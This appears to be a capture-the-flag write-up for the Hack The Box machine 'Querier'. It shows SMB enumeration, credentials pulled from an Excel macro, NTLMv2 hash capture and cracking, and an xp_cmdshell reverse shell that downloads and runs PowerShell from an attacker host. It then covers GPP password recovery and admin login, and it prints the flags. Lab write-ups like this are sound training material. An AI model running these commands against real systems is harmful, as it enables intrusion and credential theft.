**Skills Required**
● Enumeration
**Skills Learned**
● Excel macros
● PowerView

Port 445(smb)
Port 5985(winrm)
port 1433(mssql)

We began using crackmapexec to gather information
``` bash
❯ crackmapexec smb 10.10.10.125
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
```

Now We'll try to list shared resources (smb) with smbmap
``` bash
❯ smbmap -H 10.10.10.125 -u 'null'
[+] IP: 10.10.10.125:445	Name: HTB.LOCAL           	Status: Guest session   	
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Reports                                           	READ ONLY	
```

There are some resources, and We have read-only permission in the Reports resource

``` bash
smbmap -H 10.10.10.125 -u 'null' -r Reports
```

There is a .xlsm file, 
``` bash
smbmap -H 10.10.10.125 -u 'null' --download Reports/.xlsm
```

This file has no content; it only has a macro. With the olevba2 tool, we can analyze this macro.
``` bash
olevba2 -c .xlsm

```

The macro connects to a database and contains the credentials for this connection, which is a bad practice
``` bash
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
```

WE can validate these credentials with crackmapexec
``` bash
❯ crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d 'WORKGROUP.local'

SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP.local) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP.local\reporting:PcwTWTHRwryjc$c6 
```

These credentials are valid not for a domain user but for a workgroup. This means the user is only valid on the local machine.

We could try to connect with these credentials on port 1433(mssql) via the mssqlclient.py tool

``` bash
mssqlclient.py WORKGROUP/reporting@10.10.10.125 -windows-auth
SQL> xp_dirtree "\\10.10.14.5\capturehash\"

#We can try capture NTLMv2 hash authentications with smbserver

smbserver.py capturehash $(pwd) -smb2support
[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:244cbeb342b9acd1083e39489ed3203e:01010000000000000011aebca3f0d901b247bfc9d72488830000000001001000540064004c007400750063006200520003001000540064004c0074007500630062005200020010004700790041006500530070004b006500040010004700790041006500530070004b006500070008000011aebca3f0d9010600040002000000080030003000000000000000000000000030000043b8b0b283d7cb6a19b5968fcabe6938ee7f955d3485e8bb55967f0a5cf692000a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000
```

Now, we try to crack the hash with john

``` bash
john --wordlist=rockyou hash
corporate568     (mssql-svc)
```

Now we have new credentials
We validate theme again with crackmapexec
``` bash
crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'corporate568' -d 'WORKGROUP.local'
```

It's valid, so We connect again to the mssql server

``` bash
mssqlclient.py WORKGROUP/mssql-svc@10.10.10.125 -windows-auth

#We can try to get a reverse shell by injecting commands with xp_cmdshell
#Eneable xp_cmdshell
SQL> sp_configure "show advanced options", 1
SQL> reconfigure
SQL> sp_configure "xp_cmdshell", 1
SQL> reconfigure
SQL> xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.5/invokepowershelltcp.ps1\")"

#Use nishang to use invokepowershelltcp.ps1
sudo python -m http.server 80
rlwrap nc -nlvp 1234

```

This way we gain access to the victim machine, now we need to escalate privileges
``` bash
# enumerate the system with powerup.ps1
PS C:\> whoami /priv > SeImpersonatePrivilege - 
PS C:\> IEX(New-Object Net.WebClient).downloadString("http://10.10.14.5/powerup.ps1")
Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files

# on my machine
sudo python -m http.server 80
```

With this tool I found the Administrator credentials, the tool checks for cached GPP Files.
We check again with crackmapexec using these credentials

``` bash
❯ crackmapexec winrm 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d 'WORKGROUP.local'
HTTP        10.10.10.125    5985   QUERIER          [*] http://10.10.10.125:5985/wsman
HTTP        10.10.10.125    5985   QUERIER          [+] WORKGROUP.local\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
```

It's Pwn3d, so we can connect via Evil-winrm to the machine as ADministrator
``` bash

❯ evil-winrm -i 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd \Users\administrator\desktop
*Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
112c19c45bd2bdd833ff676814faccba
```

user flag > a66e4be59902f3cd1610bde31d1a23e6
root.txt > 112c19c45bd2bdd833ff676814faccba